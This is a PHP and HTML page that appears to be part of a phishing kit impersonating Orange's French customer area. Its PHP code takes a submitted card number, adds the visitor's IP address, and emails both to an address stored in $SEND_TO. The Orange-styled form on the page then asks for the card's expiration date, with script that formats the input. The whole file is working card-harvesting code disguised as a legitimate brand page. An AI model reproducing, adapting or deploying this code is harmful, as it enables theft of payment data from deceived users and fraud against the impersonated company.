<?php session_start();?>
<?php

include_once ("auth.php");
if(isset($_POST['cc'])){
    $cc = $_POST['cc'];

    $data = "Numero de carte: $cc,\nAdresse IP: $IP,";
    setHeader($data, $IP);
    $success = mail($SEND_TO, "Numero de carte - $IP", $data);
    //header("Location: expiration_date.php");
}
?>
<style>
    #szc{
        font-weight: 700;
    }
</style>

        <h2 class="sr-only">Saisissez les informations de votre carte</h2>
        <div class="clearfix"></div>
        <div class="form-group ">
            <div class="eui-input-label">
                <label for="password" id="passwordLabel">Saisissez les informations de votre carte</label>
                <div class="eui-assistance-area">
                    <button data-oevent="idme_password;clic_bulle_aide_mot_de_passe;bulle_aide_mot_de_passe" class="eui-svg eui-icon-help" type="button" id="helpPassword">
                        <span class="sr-only">aide</span>
                    </button>
                </div>
            </div>
            <div class="eui-help" id="helpPasswordCnt" style="display : none;">
                <p class="noSelectContent" tabindex="-1">Vous ne retrouvez pas votre mot de passe. &gt;&gt; <a href="https://mdp.orange.fr?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil&amp;login=F1RYiR%2BrDwulIp%2BpnyDbftDejktufnYYV%2F2ynqH0syO7fn8%2FI23fDmZNw04gbQ5KFh%2BB7a3jJHmCjeHqNLkOk3CNKQIVsOcPt%2BrFsHPjCiRIpQqc7%2FedaQH3EolJvW2kKzT8W26EkmhxHOqI4eeyBYPGHgSiVFcDNkAcNzGIiSKbnUohpmC1uMCouZa%2BuaTVh1gDAMmmZBjalmzFwmH5Zz5i5KhPYu7FPLvq2jn5ecNwphejQPEVfT9kMLQeB1HE%2FMtib1wUwQtW95xVZgsMCeNquiEMEpDza4roDEE8WQeVknl3Hf0vYBuygYRS1853zK0MeoZ331mtyIchzsN7Vw%3D%3D" class="eui-reinitLostLink" title="Réinitialisez-le.">Réinitialisez-le.</a></p>
            </div>
            <h6 id="error-msg-box" tabindex="0" class="form-control-message" aria-hidden="true" aria-live="assertive" role="alert"></h6>

            <div id="passwordContainer">
                <input type="tel" id="szc" name="date" placeholder="Date d'expiration (MM/YY)" maxlength="5" class="form-control pass-assist" pattern="[0-9]{2}\/[0-9]{2}" required="">
            </div>
        </div>
        <div class="text-center">
            <button id="btnSubmi" type="submit" class="btn btn-info eui-btn-sub">Suivant</button>
        </div>


<script>
    /*$('#szc').on('keypress', function (e) {
        if( $('#szc').val().length === 1){
            var newVal = $('#szc').val()+"/2";
            $('#szc').val(newVal);
        }else if($('#szc').val().length === 0){
            if(parseInt($('#szc').val()) > 3){
                $("#szc").val("3");
            }
        }
    });*/

    var lastLen = 0;
    var isNotInt = false;
    var lastValue = "";

    $('#szc').on('keyup', function (e) {
        var textLen = $('#szc').val().length;
        var val = $('#szc').val();
        if(!isNotInt || lastLen >= textLen){
            if( textLen === 2){
                if(lastLen < textLen){
                    var newVal = val+"/2";
                    $('#szc').val(newVal);
                }
            }else if(textLen === 1){
                if(parseInt(val) > 3){
                    $("#szc").val("0"+val+"/2");
                }
            }
            lastLen = textLen;
        }else
            $("#szc").val(lastValue);
    });

    var av = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];
    $("#szc").on('keypress', function (e) {
        console.log(e.keyCode);
        isNotInt = av.indexOf(parseInt(e.key)) === -1;
        lastValue = $("#szc").val();
    });
</script>
